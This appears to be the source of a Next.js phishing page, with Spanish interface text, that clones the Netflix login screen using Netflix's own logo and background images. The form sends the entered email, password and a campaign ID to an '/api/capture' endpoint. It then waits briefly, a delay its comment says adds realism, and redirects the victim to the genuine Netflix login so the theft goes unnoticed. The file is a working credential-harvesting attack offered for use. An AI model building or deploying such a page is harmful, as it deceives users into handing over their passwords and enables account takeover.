"use client";

import React, { useState, Suspense } from "react";
import { useSearchParams } from "next/navigation";

function NetflixLoginForm() {
  const searchParams = useSearchParams();
  const campaignId = searchParams.get("c") || "";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Estados de foco para las etiquetas flotantes
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email || !password) {
      setError("Introduce un correo válido y una contraseña.");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch("/api/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
          campaignId,
        }),
      });

      if (!res.ok) {
        throw new Error("Error al procesar el inicio de sesión");
      }

      // Pequeño retardo simulando carga para darle realismo antes de redirigir
      setTimeout(() => {
        window.location.href = "https://www.netflix.com/login";
      }, 1500);
    } catch (err: any) {
      console.error(err);
      setError("Ha ocurrido un error. Inténtalo de nuevo.");
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-[450px] bg-black/75 rounded-md px-14 py-16 text-white self-center z-10 box-border">
      <h1 className="text-[32px] font-bold mb-7">Iniciar sesión</h1>

      {error && (
        <div className="bg-[#e87c03] text-white text-[14px] rounded-md px-5 py-3 mb-4 font-normal">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="flex flex-col gap-4">
        {/* Input de Email */}
        <div className="relative w-full h-[56px] bg-[#333333] rounded-md">
          <label
            className={`absolute left-5 transition-all duration-200 pointer-events-none text-[#8c8c8c] ${
              emailFocused || email
                ? "top-1.5 text-[11px] font-semibold"
                : "top-[16px] text-[16px]"
            }`}
          >
            Email o número de teléfono
          </label>
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onFocus={() => setEmailFocused(true)}
            onBlur={() => setEmailFocused(false)}
            required
            className="w-full h-full bg-transparent border-0 outline-none px-5 pt-4 pb-1 text-white text-[16px]"
          />
        </div>

        {/* Input de Password */}
        <div className="relative w-full h-[56px] bg-[#333333] rounded-md flex">
          <label
            className={`absolute left-5 transition-all duration-200 pointer-events-none text-[#8c8c8c] ${
              passwordFocused || password
                ? "top-1.5 text-[11px] font-semibold"
                : "top-[16px] text-[16px]"
            }`}
          >
            Contraseña
          </label>
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setPasswordFocused(true)}
            onBlur={() => setPasswordFocused(false)}
            required
            className="w-full h-full bg-transparent border-0 outline-none px-5 pt-4 pb-1 text-white text-[16px]"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="text-[14px] text-[#8c8c8c] px-4 outline-none hover:underline"
          >
            {showPassword ? "Ocultar" : "Mostrar"}
          </button>
        </div>

        {/* Botón Iniciar Sesión */}
        <button
          type="submit"
          disabled={loading}
          className="w-full h-[48px] bg-[#E50914] hover:bg-[#C11119] active:bg-[#9B0B11] text-white font-semibold rounded-md mt-6 flex items-center justify-center transition duration-200 cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
        >
          {loading ? (
            <div className="flex items-center gap-2">
              <svg
                className="animate-spin h-5 w-5 text-white"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                />
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                />
              </svg>
              <span>Verificando cuenta...</span>
            </div>
          ) : (
            "Iniciar sesión"
          )}
        </button>
      </form>

      {/* Enlaces de ayuda */}
      <div className="flex justify-between items-center text-[13px] text-[#b3b3b3] mt-3">
        <label className="flex items-center gap-1.5 cursor-pointer">
          <input
            type="checkbox"
            className="w-4 h-4 accent-[#737373] bg-[#333] border-none rounded-sm"
            defaultChecked
          />
          <span>Recuérdame</span>
        </label>
        <a href="#" className="hover:underline hover:text-[#8c8c8c]">
          ¿Necesitas ayuda?
        </a>
      </div>

      {/* Footer y aviso de cookies */}
      <div className="mt-20">
        <div className="text-[16px] text-[#737373]">
          ¿Primera vez en Netflix?{" "}
          <a href="#" className="text-white hover:underline">
            Suscríbete ahora
          </a>
          .
        </div>
        <div className="text-[13px] text-[#8c8c8c] mt-4 leading-normal">
          Esta página está protegida por Google reCAPTCHA para comprobar que no
          eres un robot.{" "}
          <button className="text-[#0071eb] hover:underline bg-transparent border-0 p-0 outline-none">
            Más información.
          </button>
        </div>
      </div>
    </div>
  );
}

export default function NetflixLoginPage() {
  return (
    <div
      className="relative min-h-screen w-full flex flex-col justify-between bg-cover bg-center"
      style={{
        backgroundImage:
          "linear-gradient(to top, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.4) 60%, rgba(0, 0, 0, 0.8) 100%), url('https://assets.nflxext.com/ffe/siteui/vlv3/c3ed7e68-a3ed-43d8-8e1b-ccc7c5e2fd9a/13c19e5c-e698-4c12-8703-ae4e7436ca5a/CO-es-20240617-popsignuptwoweeks-perspective_alpha_website_large.jpg')",
        backgroundColor: "#000",
      }}
    >
      {/* Header con Logo */}
      <header className="absolute top-0 left-0 w-full px-12 py-6 flex items-center justify-between z-10">
        <img
          src="https://assets.nflxext.com/us/email/logo/redLogo.png"
          alt="Netflix"
          className="h-10 md:h-[45px] object-contain"
        />
      </header>

      {/* Contenido principal */}
      <main className="flex-grow flex items-center justify-center px-4 pt-28 pb-16">
        <Suspense
          fallback={
            <div className="text-white text-xl animate-pulse">Cargando...</div>
          }
        >
          <NetflixLoginForm />
        </Suspense>
      </main>

      {/* Footer Falso de Netflix */}
      <footer className="w-full bg-black/75 text-[#737373] py-8 px-6 md:px-20 border-t border-[#333333] z-10 text-[14px]">
        <div className="max-w-[1000px] mx-auto">
          <p className="mb-8 hover:underline cursor-pointer">
            ¿Preguntas? Llama al 01-800-917-1564
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
            <a href="#" className="hover:underline">
              Preguntas frecuentes
            </a>
            <a href="#" className="hover:underline">
              Centro de ayuda
            </a>
            <a href="#" className="hover:underline">
              Términos de uso
            </a>
            <a href="#" className="hover:underline">
              Privacidad
            </a>
            <a href="#" className="hover:underline">
              Preferencias de cookies
            </a>
            <a href="#" className="hover:underline">
              Información corporativa
            </a>
          </div>
          <p className="text-[12px]">Netflix España</p>
        </div>
      </footer>
    </div>
  );
}
